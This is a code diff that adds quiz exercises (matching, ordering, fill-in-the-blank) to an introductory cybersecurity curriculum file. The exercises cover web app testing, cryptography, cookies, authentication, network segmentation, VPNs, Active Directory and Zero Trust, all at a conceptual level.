+            ]
+          }
+        ],
         moduleId: "m3-windows",
         number: 53,
         title: "TryHackMe: Windows Fundamentals Parts 1, 2, and 3",
@@ -8350,6 +10316,40 @@ export const CURRICULUM: Module[] = [
     topics: [
       {
         id: "m4-1",
+        exercises: [
+          {
+            "type": "match",
+            "prompt": "Match each application category to how it is primarily tested.",
+            "pairs": [
+              {
+                "left": "Web app",
+                "right": "Via an HTTP proxy like Burp"
+              },
+              {
+                "left": "Mobile app",
+                "right": "Static analysis + intercepting its API traffic"
+              },
+              {
+                "left": "Thick client",
+                "right": "Binary and traffic analysis of a native app"
+              }
+            ],
+            "explanation": "Where an app sits on the web/mobile/thick-client spectrum changes which interface you reach it through, so each category has its own testing approach."
+          },
+          {
+            "type": "fill-blank",
+            "prompt": "Complete the fact about mobile app attack surface.",
+            "template": "Mobile apps ship logic to the device as an ___ or IPA, so they are tested with static analysis plus API interception.",
+            "blanks": [
+              "APK"
+            ],
+            "explanation": "A mobile app packages its logic on-device (APK on Android, IPA on iOS), unlike a web app where the server does most of the work.",
+            "distractors": [
+              "EXE",
+              "DLL"
+            ]
+          }
+        ],
         moduleId: "m4",
         number: 54,
         title: "Web vs Mobile vs Thick Client Applications",
@@ -8465,6 +10465,47 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m4-2",
+        exercises: [
+          {
+            "type": "order",
+            "prompt": "Put the first five SDLC phases in their correct order.",
+            "items": [
+              "Planning",
+              "Analysis",
+              "Design",
+              "Implementation",
+              "Testing"
+            ],
+            "explanation": "SDLC runs Planning -> Analysis -> Design -> Implementation -> Testing -> Deployment -> Maintenance; each phase builds on the one before it."
+          },
+          {
+            "type": "match",
+            "prompt": "Match each SDLC phase to its security activity.",
+            "pairs": [
+              {
+                "left": "Planning",
+                "right": "Identify security needs and compliance"
+              },
+              {
+                "left": "Design",
+                "right": "Secure design principles like least privilege"
+              },
+              {
+                "left": "Implementation",
+                "right": "Secure coding practices"
+              },
+              {
+                "left": "Testing",
+                "right": "Penetration tests and code reviews"
+              },
+              {
+                "left": "Deployment",
+                "right": "Secure configuration and patching"
+              }
+            ],
+            "explanation": "Embedding security in every phase catches vulnerabilities early, before they become costly issues in the finished product."
+          }
+        ],
         moduleId: "m4",
         number: 55,
         title: "Software Development Life Cycle (SDLC)",
@@ -8578,6 +10619,44 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m4-3",
+        exercises: [
+          {
+            "type": "match",
+            "prompt": "Match each frontend layer to its role (body analogy).",
+            "pairs": [
+              {
+                "left": "HTML",
+                "right": "Skeleton: structures the content"
+              },
+              {
+                "left": "CSS",
+                "right": "Skin/clothes: presentation and layout"
+              },
+              {
+                "left": "JavaScript",
+                "right": "Muscles/nerves: interactivity"
+              },
+              {
+                "left": "DOM",
+                "right": "Interface JS uses to manipulate elements"
+              }
+            ],
+            "explanation": "HTML, CSS, and JavaScript are three separate layers; the DOM is the programming interface JavaScript uses to change elements dynamically."
+          },
+          {
+            "type": "fill-blank",
+            "prompt": "Complete the fact about client-side security.",
+            "template": "Any validation written in ___ can be read and bypassed with DevTools, so it is a UX feature, not a security control.",
+            "blanks": [
+              "JavaScript"
+            ],
+            "explanation": "Because client-side JavaScript runs in the attacker's own browser, they can inspect and bypass it; real enforcement must happen on the backend.",
+            "distractors": [
+              "SQL",
+              "HTTPS"
+            ]
+          }
+        ],
         moduleId: "m4",
         number: 56,
         title: "Frontend (HTML, CSS, JavaScript, React, Angular)",
@@ -8688,6 +10767,38 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m4-4",
+        exercises: [
+          {
+            "type": "match",
+            "prompt": "Match each backend component to its kitchen-analogy role.",
+            "pairs": [
+              {
+                "left": "Web server",
+                "right": "Waiter: takes requests, serves responses"
+              },
+              {
+                "left": "Application logic",
+                "right": "Chef: executes business rules"
+              },
+              {
+                "left": "Data management",
+                "right": "Pantry: stores and manages the data"
+              }
+            ],
+            "explanation": "The backend is the engine users never see; the waiter, chef, and pantry map to the web server, application logic, and data layer."
+          },
+          {
+            "type": "order",
+            "prompt": "Order the backend request-response steps for the 'Order Pizza' example.",
+            "items": [
+              "User clicks 'Order Pizza'",
+              "Backend checks the order",
+              "Backend retrieves details from the database",
+              "Backend sends a confirmation to the frontend"
+            ],
+            "explanation": "The backend receives the request, validates it, pulls data from the database, and returns a response to the frontend."
+          }
+        ],
         moduleId: "m4",
         number: 57,
         title: "Backend (Node.js, Python/Django/Flask, Java, PHP)",
@@ -8813,6 +10924,44 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m4-5",
+        exercises: [
+          {
+            "type": "match",
+            "prompt": "Match each HTTP method to the action it performs.",
+            "pairs": [
+              {
+                "left": "GET",
+                "right": "Read"
+              },
+              {
+                "left": "POST",
+                "right": "Create"
+              },
+              {
+                "left": "PUT",
+                "right": "Replace"
+              },
+              {
+                "left": "DELETE",
+                "right": "Remove"
+              }
+            ],
+            "explanation": "These standard HTTP methods map to CRUD operations, which is how a REST API performs Create, Read, Update, and Delete."
+          },
+          {
+            "type": "fill-blank",
+            "prompt": "Complete the definition of REST.",
+            "template": "REST uses standard HTTP requests to perform ___ operations: Create, Read, Update, Delete.",
+            "blanks": [
+              "CRUD"
+            ],
+            "explanation": "REST is a simple, fast architectural style for CRUD over HTTP; SOAP, by contrast, is a more rigid XML-based protocol.",
+            "distractors": [
+              "SOAP",
+              "XML"
+            ]
+          }
+        ],
         moduleId: "m4",
         number: 58,
         title:
@@ -8954,6 +11103,44 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m4-6",
+        exercises: [
+          {
+            "type": "match",
+            "prompt": "Match each CRUD operation to its example.",
+            "pairs": [
+              {
+                "left": "Create",
+                "right": "Add a new customer record"
+              },
+              {
+                "left": "Read",
+                "right": "Query customers who bought X last month"
+              },
+              {
+                "left": "Update",
+                "right": "Change a customer's address"
+              },
+              {
+                "left": "Delete",
+                "right": "Remove an old customer record"
+              }
+            ],
+            "explanation": "CRUD (Create, Read, Update, Delete) are the four core operations a DBMS performs on data on your behalf."
+          },
+          {
+            "type": "fill-blank",
+            "prompt": "Complete the SQL query from the source.",
+            "template": "SELECT * FROM users WHERE ___ = 1;",
+            "blanks": [
+              "id"
+            ],
+            "explanation": "This relational SQL query reads rows from a table; a MongoDB (NoSQL) app would store and query JSON documents instead.",
+            "distractors": [
+              "name",
+              "user"
+            ]
+          }
+        ],
         moduleId: "m4",
         number: 59,
         title: "Databases - SQL vs NoSQL (MySQL, PostgreSQL, MongoDB)",
@@ -9066,6 +11253,39 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m4-7",
+        exercises: [
+          {
+            "type": "match",
+            "prompt": "Match each cookie attribute to what it does.",
+            "pairs": [
+              {
+                "left": "HttpOnly",
+                "right": "Blocks JavaScript from reading the cookie"
+              },
+              {
+                "left": "Secure",
+                "right": "Cookie only sent over HTTPS"
+              },
+              {
+                "left": "SameSite=Strict",
+                "right": "Blocks the cookie on cross-site requests"
+              }
+            ],
+            "explanation": "HttpOnly mitigates XSS theft, Secure prevents plaintext leakage, and SameSite=Strict mitigates CSRF."
+          },
+          {
+            "type": "order",
+            "prompt": "Order the steps by which a cookie lets a server 'remember' you.",
+            "items": [
+              "Browser visits the site for the first time",
+              "Server hands the browser a cookie",
+              "Browser stores the cookie",
+              "Browser sends the cookie back on every later request",
+              "Server recognizes the returning user"
+            ],
+            "explanation": "This loyalty-card mechanism is why a session cookie acts as a bearer credential: whoever holds its value is treated as the logged-in user."
+          }
+        ],
         moduleId: "m4",
         number: 60,
         title: "Sessions & Cookies (HttpOnly, Secure, SameSite attributes)",
@@ -9187,6 +11407,40 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m4-8",
+        exercises: [
+          {
+            "type": "match",
+            "prompt": "Match each MFA factor category to an example.",
+            "pairs": [
+              {
+                "left": "Something you know",
+                "right": "Password or PIN"
+              },
+              {
+                "left": "Something you have",
+                "right": "Smartphone or hardware token"
+              },
+              {
+                "left": "Something you are",
+                "right": "Fingerprint or face"
+              }
+            ],
+            "explanation": "MFA requires two or more factors drawn from these three distinct categories, which is stronger than single-factor username + password."
+          },
+          {
+            "type": "fill-blank",
+            "prompt": "Complete the definition of the token-based login method.",
+            "template": "___ lets a third-party app access user data without the user handing over their actual password (e.g. login via Google or GitHub).",
+            "blanks": [
+              "OAuth"
+            ],
+            "explanation": "Because OAuth substitutes tokens for shared credentials, its new attack surface is the token/redirect flow, such as misconfigured redirect URIs.",
+            "distractors": [
+              "MFA",
+              "SFA"
+            ]
+          }
+        ],
         moduleId: "m4",
         number: 61,
         title: "Authentication Methods (Password, MFA, OAuth 2.0, Form-based)",
@@ -9297,6 +11551,43 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m4-9",
+        exercises: [
+          {
+            "type": "match",
+            "prompt": "Match each access-control model to its defining rule.",
+            "pairs": [
+              {
+                "left": "RBAC",
+                "right": "Permissions tied to a predefined role"
+              },
+              {
+                "left": "ABAC",
+                "right": "Decisions based on attributes like time and location"
+              },
+              {
+                "left": "DAC",
+                "right": "Resource owner decides who gets access"
+              },
+              {
+                "left": "MAC",
+                "right": "System enforces a central security policy"
+              }
+            ],
+            "explanation": "These four models differ in who decides access: a role (RBAC), attributes (ABAC), the owner (DAC), or a system-wide policy (MAC)."
+          },
+          {
+            "type": "order",
+            "prompt": "Order the authorization workflow steps.",
+            "items": [
+              "Authenticate the user",
+              "Identify roles and attributes",
+              "Compare against policy",
+              "Grant or deny access",
+              "Log the decision"
+            ],
+            "explanation": "Authorization runs only after identity is proven; a missing check at any step is what causes Broken Access Control."
+          }
+        ],
         moduleId: "m4",
         number: 62,
         title: "Authorization - RBAC & ABAC",
@@ -9420,6 +11711,33 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m4-10",
+        exercises: [
+          {
+            "type": "order",
+            "prompt": "Order the DevTools steps to inspect and tamper with a session cookie.",
+            "items": [
+              "Open DevTools with F12",
+              "Go to the Application/Storage tab",
+              "Select Cookies to list the site's cookies",
+              "Identify the session cookie",
+              "Edit its value and reload to observe the response"
+            ],
+            "explanation": "Editing the cookie value and reloading shows that the value alone separates 'logged in' from 'logged out' — the basis of session hijacking."
+          },
+          {
+            "type": "fill-blank",
+            "prompt": "Complete the DevTools navigation step.",
+            "template": "In DevTools, open the ___ tab, then Cookies, to view every cookie the server handed your browser.",
+            "blanks": [
+              "Application"
+            ],
+            "explanation": "The Application/Storage tab lists all cookies, letting you check a session cookie for missing HttpOnly, Secure, or SameSite flags.",
+            "distractors": [
+              "Console",
+              "Network"
+            ]
+          }
+        ],
         moduleId: "m4",
         number: 63,
         title: "Lab: Inspect & manipulate session cookies with DevTools",
@@ -9541,6 +11859,40 @@ export const CURRICULUM: Module[] = [
     topics: [
       {
         id: "m5-1",
+        exercises: [
+          {
+            "type": "match",
+            "prompt": "Match each data-transformation technique to its defining property.",
+            "pairs": [
+              {
+                "left": "Encoding",
+                "right": "Reversible, no key involved"
+              },
+              {
+                "left": "Encryption",
+                "right": "Reversible only with the secret key"
+              },
+              {
+                "left": "Hashing",
+                "right": "One-way, fixed-length, no key to reverse"
+              }
+            ],
+            "explanation": "Confusing these three is the root of OWASP A02 Cryptographic Failures: encoding adds no security, encryption needs a key, and hashing cannot be reversed at all."
+          },
+          {
+            "type": "fill-blank",
+            "prompt": "Complete the Base64 encoding of the string 'Hello'.",
+            "template": "Base64 encoding 'Hello' produces ___",
+            "blanks": [
+              "SGVsbG8="
+            ],
+            "explanation": "Base64 only reformats data with no key, so 'Hello' deterministically becomes SGVsbG8= and anyone can decode it back.",
+            "distractors": [
+              "48656c6c6f",
+              "Hello"
+            ]
+          }
+        ],
         moduleId: "m5",
         number: 64,
         title:
@@ -9663,6 +12015,40 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m5-2",
+        exercises: [
+          {
+            "type": "match",
+            "prompt": "Match each encoding scheme to what it does.",
+            "pairs": [
+              {
+                "left": "Base64",
+                "right": "Represents binary data as ASCII text (Basic Auth)"
+              },
+              {
+                "left": "URL encoding",
+                "right": "Escapes special characters for safe use in a URL"
+              },
+              {
+                "left": "HTML encoding",
+                "right": "Escapes HTML-meaningful characters, core XSS defence"
+              }
+            ],
+            "explanation": "Each scheme safely represents data in a different format; only HTML encoding has a security role, and that is output-escaping against XSS, not hiding data."
+          },
+          {
+            "type": "fill-blank",
+            "prompt": "Fill in the URL-encoded form of a space character.",
+            "template": "In URL encoding, a space character becomes ___",
+            "blanks": [
+              "%20"
+            ],
+            "explanation": "URL encoding replaces unsafe characters with a percent sign and their hex code, so a space becomes %20.",
+            "distractors": [
+              "%2F",
+              "&nbsp;"
+            ]
+          }
+        ],
         moduleId: "m5",
         number: 65,
         title: "Common Encoding Schemes (Base64, URL encoding, HTML encoding)",
@@ -9758,6 +12144,42 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m5-3",
+        exercises: [
+          {
+            "type": "order",
+            "prompt": "Order the steps of a symmetric encryption round-trip.",
+            "items": [
+              "Both parties agree on the shared secret key 'mysecretkey'",
+              "Encrypt 'Hello, World!' with AES using that key",
+              "Transmit the resulting ciphertext",
+              "Decrypt with the same key to recover 'Hello, World!'"
+            ],
+            "explanation": "Symmetric crypto uses one identical key for both directions, so the same secret that encrypts the plaintext is what recovers it."
+          },
+          {
+            "type": "match",
+            "prompt": "Match each symmetric-crypto item to its fact.",
+            "pairs": [
+              {
+                "left": "AES",
+                "right": "Modern standard used in WPA2/3 and BitLocker"
+              },
+              {
+                "left": "DES",
+                "right": "Deprecated, trivially small 56-bit key"
+              },
+              {
+                "left": "Hardcoded key in source",
+                "right": "Poor key management, trivially recoverable"
+              },
+              {
+                "left": "Secure key storage",
+                "right": "Environment variable or secure vault"
+              }
+            ],
+            "explanation": "AES is the current standard and DES is weak, but the bigger real-world failure is key management: a key like ENCRYPTION_KEY = \"mysecretkey123\" in source is recoverable by anyone with source access."
+          }
+        ],
         moduleId: "m5",
         number: 66,
         title: "Symmetric Cryptography (AES, DES, 3DES, key exchange problem)",
@@ -9895,6 +12317,45 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m5-4",
+        exercises: [
+          {
+            "type": "fill-blank",
+            "prompt": "Complete the rule for sending a friend a secure asymmetric message.",
+            "template": "Encrypt the message with your friend's ___ key; only their ___ key can decrypt it.",
+            "blanks": [
+              "public",
+              "private"
+            ],
+            "explanation": "The public key is safe to share and used to encrypt, while only the matching private key the owner holds can decrypt, which solves the key-exchange problem.",
+            "distractors": [
+              "shared",
+              "session"
+            ]
+          },
+          {
+            "type": "match",
+            "prompt": "Match each asymmetric-crypto item to its description.",
+            "pairs": [
+              {
+                "left": "RSA",
+                "right": "Based on difficulty of factoring large primes"
+              },
+              {
+                "left": "ECC",
+                "right": "Smaller keys for equivalent security"
+              },
+              {
+                "left": "Public key",
+                "right": "Shared with everyone, used to encrypt"
+              },
+              {
+                "left": "Private key",
+                "right": "Kept secret, used to decrypt"
+              }
+            ],
+            "explanation": "RSA and ECC are the two named asymmetric algorithms; both rely on a mathematically linked public/private key pair where only the private key is kept secret."
+          }
+        ],
         moduleId: "m5",
         number: 67,
         title: "Asymmetric Cryptography (RSA, ECC, public/private key pair)",
@@ -10004,6 +12465,45 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m5-5",
+        exercises: [
+          {
+            "type": "match",
+            "prompt": "Match each hashing choice to its suitability for password storage.",
+            "pairs": [
+              {
+                "left": "MD5 / SHA-1",
+                "right": "Broken and crackable, no built-in salt"
+              },
+              {
+                "left": "SHA-256",
+                "right": "Good for integrity, too fast for passwords"
+              },
+              {
+                "left": "bcrypt / Argon2",
+                "right": "Deliberately slow, automatic per-hash salt"
+              },
+              {
+                "left": "Plaintext storage",
+                "right": "Every password readable from the database"
+              }
+            ],
+            "explanation": "General-purpose hashes are fast (wrong for passwords) and MD5/SHA-1 are additionally broken; bcrypt and Argon2 are purpose-built to be slow and auto-salted."
+          },
+          {
+            "type": "fill-blank",
+            "prompt": "Complete the secure bcrypt register/login pattern.",
+            "template": "Registration calls bcrypt.hashpw(password.encode(), bcrypt.___()); login calls bcrypt.___(password.encode(), stored_hash).",
+            "blanks": [
+              "gensalt",
+              "checkpw"
+            ],
+            "explanation": "bcrypt.gensalt() generates a per-hash salt during registration, and bcrypt.checkpw() verifies a login attempt so the plaintext password is never stored or directly compared.",
+            "distractors": [
+              "hashpw",
+              "verify"
+            ]
+          }
+        ],
         moduleId: "m5",
         number: 68,
         title: "Hashing Algorithms (MD5, SHA-1, SHA-256, bcrypt, Argon2)",
@@ -10130,6 +12630,33 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m5-6",
+        exercises: [
+          {
+            "type": "order",
+            "prompt": "Order the steps of signing then verifying a digital signature.",
+            "items": [
+              "Hash the message",
+              "Encrypt the hash with the signer's private key",
+              "Recipient decrypts the signature with the sender's public key",
+              "Compare the result to a fresh hash of the message"
+            ],
+            "explanation": "Signing encrypts a hash with the private key; verification reverses it with the public key and compares hashes, proving both integrity and authenticity."
+          },
+          {
+            "type": "fill-blank",
+            "prompt": "Complete which keys perform signing and verification.",
+            "template": "The sender signs with their ___ key; anyone verifies using the sender's ___ key.",
+            "blanks": [
+              "private",
+              "public"
+            ],
+            "explanation": "Only the private-key holder can produce the signature, and because anyone can verify with the matching public key, the signature proves it came from that sender.",
+            "distractors": [
+              "shared",
+              "session"
+            ]
+          }
+        ],
         moduleId: "m5",
         number: 69,
         title: "Digital Signatures (how they work, signing & verification)",
@@ -10231,6 +12758,38 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m5-7",
+        exercises: [
+          {
+            "type": "order",
+            "prompt": "Order the simplified steps of a TLS handshake.",
+            "items": [
+              "Client and server agree on a cipher suite",
+              "Server presents its X.509 certificate",
+              "Key exchange occurs",
+              "Encrypted session begins"
+            ],
+            "explanation": "The handshake negotiates a cipher suite, the server proves identity with its certificate, keys are exchanged, and only then does encrypted traffic flow."
+          },
+          {
+            "type": "match",
+            "prompt": "Match each PKI component to its role.",
+            "pairs": [
+              {
+                "left": "X.509 certificate",
+                "right": "Binds a public key to a domain identity"
+              },
+              {
+                "left": "Root CA",
+                "right": "Trust anchor pre-installed in your OS/browser"
+              },
+              {
+                "left": "Intermediate CA",
+                "right": "Signed by a root, signs site certificates"
+              }
+            ],
+            "explanation": "The chain of trust runs from a small set of trusted Root CAs, through Intermediate CAs, down to the X.509 certificate that binds a public key to a site."
+          }
+        ],
         moduleId: "m5",
         number: 70,
         title: "Certificates & PKI (X.509, CA, chain of trust, TLS handshake)",
@@ -10339,6 +12898,40 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m5-8",
+        exercises: [
+          {
+            "type": "fill-blank",
+            "prompt": "Complete the core property of a key-exchange protocol.",
+            "template": "Key exchange lets two parties agree on a shared ___ over an untrusted channel without ever transmitting it.",
+            "blanks": [
+              "secret"
+            ],
+            "explanation": "Protocols like Diffie-Hellman let both sides independently derive the same shared secret, so the secret itself never travels over the channel.",
+            "distractors": [
+              "certificate",
+              "private key"
+            ]
+          },
+          {
+            "type": "match",
+            "prompt": "Match each key-exchange concept to its description.",
+            "pairs": [
+              {
+                "left": "Diffie-Hellman",
+                "right": "Combine a private value with a shared public value"
+              },
+              {
+                "left": "ECDH",
+                "right": "Elliptic-curve variant used for forward secrecy"
+              },
+              {
+                "left": "Shared secret",
+                "right": "Derived independently, never transmitted"
+              }
+            ],
+            "explanation": "ECDH is the elliptic-curve form of Diffie-Hellman used throughout modern TLS, and both let each party derive the same secret without sending it."
+          }
+        ],
         moduleId: "m5",
         number: 71,
         title: "Key Exchange (Diffie-Hellman, ECDH)",
@@ -10433,6 +13026,31 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m5-9",
+        exercises: [
+          {
+            "type": "order",
+            "prompt": "Order the lab steps for practising Base64 by hand.",
+            "items": [
+              "Encode 5 strings to Base64",
+              "Decode them back by hand without a tool",
+              "Verify the results with CyberChef"
+            ],
+            "explanation": "Doing the conversion by hand first builds the intuition to recognise encoded data during recon before you confirm with tooling like CyberChef."
+          },
+          {
+            "type": "fill-blank",
+            "prompt": "Fill in the telltale character that marks Base64 output.",
+            "template": "Base64 output is recognisable by its trailing ___ padding character.",
+            "blanks": [
+              "="
+            ],
+            "explanation": "The '=' padding plus Base64's limited character set are the giveaways that let you instantly spot encoded data.",
+            "distractors": [
+              "%",
+              "+"
+            ]
+          }
+        ],
         moduleId: "m5",
         number: 72,
         title: "Lab: Manually encode/decode strings in Base64 & URL encoding",
@@ -10537,6 +13155,34 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m5-10",
+        exercises: [
+          {
+            "type": "order",
+            "prompt": "Order the OpenSSL lab steps to sign and verify a file.",
+            "items": [
+              "Generate the RSA private key",
+              "Derive the public key from the private key",
+              "Sign the file's hash with the private key",
+              "Verify the signature using only the public key"
+            ],
+            "explanation": "You create the private key first and derive the public key from it, then sign with the private key and verify with only the public key."
+          },
+          {
+            "type": "fill-blank",
+            "prompt": "Complete which keys sign and verify, and what tampering does.",
+            "template": "Sign the file with the ___ key, then verify using only the ___ key; tampering after signing makes verification ___.",
+            "blanks": [
+              "private",
+              "public",
+              "fail"
+            ],
+            "explanation": "Signing uses the private key and verification uses the public key; because the signature covers the file's hash, any later change breaks it and verification fails.",
+            "distractors": [
+              "shared",
+              "succeed"
+            ]
+          }
+        ],
         moduleId: "m5",
         number: 73,
         title: "Lab: Generate RSA keypair with OpenSSL, sign & verify a file",
@@ -10694,6 +13340,49 @@ export const CURRICULUM: Module[] = [
     topics: [
       {
         id: "m6-1",
+        exercises: [
+          {
+            "type": "match",
+            "prompt": "Match each part of the office-building analogy to the corporate-network component it represents.",
+            "pairs": [
+              {
+                "left": "Rooms",
+                "right": "Departments (HR/Finance/IT)"
+              },
+              {
+                "left": "Corridors",
+                "right": "LAN"
+              },
+              {
+                "left": "Elevators & the internet",
+                "right": "WANs linking distant offices"
+              },
+              {
+                "left": "Security guards",
+                "right": "Firewalls"
+              },
+              {
+                "left": "IT team",
+                "right": "Maintenance crew patching vulnerabilities"
+              }
+            ],
+            "explanation": "The analogy maps physical building features to network concepts: corridors are the LAN, WANs connect branches, and firewalls act as the guards at the entrances."
+          },
+          {
+            "type": "fill-blank",
+            "prompt": "Complete the distinction between the two network scopes.",
+            "template": "___ connect devices within the same office or building, while ___ extend connectivity to remote offices and branches.",
+            "blanks": [
+              "LANs",
+              "WANs"
+            ],
+            "explanation": "LANs cover a single building; WANs stretch across locations to keep operations smooth between distant sites.",
+            "distractors": [
+              "VPNs",
+              "DMZs"
+            ]
+          }
+        ],
         moduleId: "m6",
         number: 74,
         title: "Corporate Network Architecture Overview",
@@ -10848,6 +13537,40 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m6-2",
+        exercises: [
+          {
+            "type": "match",
+            "prompt": "Match each enterprise network topology to its defining characteristic.",
+            "pairs": [
+              {
+                "left": "Flat network",
+                "right": "One broadcast domain; a single compromised host can reach everything"
+              },
+              {
+                "left": "Segmented network",
+                "right": "Split into zones/VLANs, limiting lateral movement"
+              },
+              {
+                "left": "Hub-and-spoke",
+                "right": "A central site connects to multiple branch sites"
+              }
+            ],
+            "explanation": "Layout drives blast radius: flat networks let one host reach all, segmentation contains a breach, and hub-and-spoke centralises multi-office connectivity."
+          },
+          {
+            "type": "fill-blank",
+            "prompt": "Fill in the topology that reduces blast radius.",
+            "template": "A ___ network is split into zones or VLANs to limit lateral movement if one segment is breached.",
+            "blanks": [
+              "segmented"
+            ],
+            "explanation": "Segmentation confines an attacker to one zone instead of letting them reach the whole network as in a flat design.",
+            "distractors": [
+              "flat",
+              "hub-and-spoke"
+            ]
+          }
+        ],
         moduleId: "m6",
         number: 75,
         title:
@@ -11057,6 +13780,41 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m6-3",
+        exercises: [
+          {
+            "type": "fill-blank",
+            "prompt": "Complete the facts about routing and tagging between VLANs.",
+            "template": "A ___ device (router or Layer-3 switch) is required to route traffic between VLANs, and ___ is the standard tagging protocol used on trunk links.",
+            "blanks": [
+              "Layer-3",
+              "802.1Q"
+            ],
+            "explanation": "VLANs are isolated broadcast domains; inter-VLAN traffic needs Layer-3 routing, and 802.1Q tags carry multiple VLANs across trunk links.",
+            "distractors": [
+              "Layer-2",
+              "802.11"
+            ]
+          },
+          {
+            "type": "match",
+            "prompt": "Match each VLAN ID to the department it is assigned to in the example.",
+            "pairs": [
+              {
+                "left": "VLAN 10",
+                "right": "HR"
+              },
+              {
+                "left": "VLAN 20",
+                "right": "IT"
+              },
+              {
+                "left": "VLAN 30",
+                "right": "Finance"
+              }
+            ],
+            "explanation": "Switch ports are assigned VLAN IDs so departments stay isolated on the same physical switch unless traffic is explicitly routed between them."
+          }
+        ],
         moduleId: "m6",
         number: 76,
         title: "VLANs (Virtual LANs) & Network Segmentation",
@@ -11195,6 +13953,45 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m6-4",
+        exercises: [
+          {
+            "type": "match",
+            "prompt": "Match each traffic direction across a 3-legged-firewall DMZ to its rule.",
+            "pairs": [
+              {
+                "left": "Internet to DMZ",
+                "right": "Allowed (e.g. HTTP to the web server)"
+              },
+              {
+                "left": "DMZ to Internal",
+                "right": "Strictly restricted"
+              },
+              {
+                "left": "Internal to DMZ",
+                "right": "Allowed for administration"
+              },
+              {
+                "left": "Internet to Internal",
+                "right": "Blocked outright"
+              }
+            ],
+            "explanation": "These rules enforce containment: public traffic reaches only the DMZ, and a compromised DMZ host cannot freely pivot into the internal network."
+          },
+          {
+            "type": "fill-blank",
+            "prompt": "Complete the description of the typical DMZ firewall layout.",
+            "template": "A typical ___ firewall has three interfaces: one facing the internet, one facing the internal LAN, and one facing the ___.",
+            "blanks": [
+              "3-legged",
+              "DMZ"
+            ],
+            "explanation": "The 3-legged firewall uses a dedicated DMZ interface so public services are isolated between the untrusted internet and the trusted LAN.",
+            "distractors": [
+              "stateful",
+              "VLAN"
+            ]
+          }
+        ],
         moduleId: "m6",
         number: 77,
         title: "DMZ (Demilitarised Zone) - Purpose & Design",
@@ -11334,6 +14131,47 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m6-5",
+        exercises: [
+          {
+            "type": "order",
+            "prompt": "Put the corporate VPN traffic flow in the correct order.",
+            "items": [
+              "User connects to the VPN server",
+              "VPN encrypts the traffic",
+              "Encrypted data travels securely over the internet",
+              "Server forwards the request to its destination",
+              "Response returns to the user via the same tunnel"
+            ],
+            "explanation": "The encrypted tunnel hides the user's IP and makes activity hard to track as data flows out and the response returns along the same path."
+          },
+          {
+            "type": "match",
+            "prompt": "Match each VPN flavor to its description.",
+            "pairs": [
+              {
+                "left": "Remote Access VPN",
+                "right": "Individual employees connect from home or travel"
+              },
+              {
+                "left": "Site-to-Site VPN",
+                "right": "Permanently links two office networks over the internet"
+              },
+              {
+                "left": "SSL/TLS VPN",
+                "right": "Encrypted access through a web browser"
+              },
+              {
+                "left": "IPSec VPN",
+                "right": "Common protocol giving strong security for data transmission"
+              },
+              {
+                "left": "MPLS VPN",
+                "right": "Used by large enterprises for efficient secure communication"
+              }
+            ],
+            "explanation": "Real deployments pick a VPN type by use case, from per-user remote access to permanent site-to-site links and enterprise MPLS."
+          }
+        ],
         moduleId: "m6",
         number: 78,
         title: "VPN in Corporate Environments (site-to-site, remote access)",
@@ -11489,6 +14327,49 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m6-6",
+        exercises: [
+          {
+            "type": "match",
+            "prompt": "Match each Active Directory concept to its role.",
+            "pairs": [
+              {
+                "left": "Domains, Trees, Forests",
+                "right": "AD's hierarchical structure"
+              },
+              {
+                "left": "Organizational Units (OUs)",
+                "right": "Group users and computers"
+              },
+              {
+                "left": "Group Policy Objects (GPOs)",
+                "right": "Push centralised config to domain-joined machines"
+              },
+              {
+                "left": "Access Control Lists (ACLs)",
+                "right": "Specify who can read, write, or modify AD data"
+              },
+              {
+                "left": "Multi-Factor Authentication (MFA)",
+                "right": "Adds verification beyond passwords"
+              }
+            ],
+            "explanation": "AD centralises identity and access; OUs organise objects, GPOs enforce config, and ACLs plus MFA control and harden access."
+          },
+          {
+            "type": "fill-blank",
+            "prompt": "Complete the description of a common AD attack.",
+            "template": "In ___, attackers request service tickets for AD service accounts and crack them offline with tools like ___.",
+            "blanks": [
+              "Kerberoasting",
+              "Hashcat"
+            ],
+            "explanation": "Kerberoasting recovers a service account's password by cracking its ticket offline with Hashcat or John the Ripper.",
+            "distractors": [
+              "Pass-the-Hash",
+              "Wireshark"
+            ]
+          }
+        ],
         moduleId: "m6",
         number: 79,
         title:
@@ -11652,6 +14533,41 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m6-7",
+        exercises: [
+          {
+            "type": "fill-blank",
+            "prompt": "Complete the Zero Trust motto and a core principle.",
+            "template": "Zero Trust's motto is '___ trust, ___ verify,' assuming no user or device is trusted by default.",
+            "blanks": [
+              "never",
+              "always"
+            ],
+            "explanation": "Zero Trust treats every request as untrusted even inside the perimeter, re-verifying identity at each checkpoint like an airport.",
+            "distractors": [
+              "sometimes",
+              "rarely"
+            ]
+          },
+          {
+            "type": "match",
+            "prompt": "Match each Zero Trust component to its function.",
+            "pairs": [
+              {
+                "left": "IAM",
+                "right": "Authenticates and authorizes every request"
+              },
+              {
+                "left": "Micro-Segmentation",
+                "right": "Limits lateral movement across the network"
+              },
+              {
+                "left": "Real-Time Monitoring",
+                "right": "Continuously watches user behavior for anomalies"
+              }
+            ],
+            "explanation": "The three pillars work together: IAM verifies each request, micro-segmentation contains attackers, and monitoring catches anomalies."
+          }
+        ],
         moduleId: "m6",
         number: 80,
